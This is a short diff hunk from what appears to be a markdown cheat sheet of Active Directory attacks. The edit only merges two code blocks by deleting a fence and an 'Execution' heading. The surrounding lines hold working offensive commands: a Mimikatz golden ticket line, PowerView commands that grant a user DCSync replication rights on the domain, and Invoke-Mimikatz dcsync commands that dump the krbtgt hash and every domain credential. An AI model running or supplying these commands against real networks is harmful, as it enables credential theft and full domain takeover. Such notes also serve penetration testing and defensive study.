@@ -74,9 +74,7 @@ kerberos::golden /user:Administrator /domain:Insomnia.io /sid:S-1-5-21-386582369
 ```
 Get-ObjectAcl -DistinguishedName "dc=insomnia,dc=io" -ResolveGUIDs | ? {($_.IdentityReference -match "John") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
 Add-ObjectAcl -TargetDistinguishedName "dc=insomnia,dc=io" -PrincipalSamAccountName John -Rights DCSync 
-```
-### Execution
-```
+
 Invoke-Mimikatz -command '"lsadump::dcsync /user:ins0mnia\krbtgt"'
 Invoke-Mimikatz -command '"lsadump::dcsync /domain:insomnia.io /all /csv"'
 Invoke-Mimikatz -command '"lsadump::dcsync /domain:ins0mnia /user:john"'
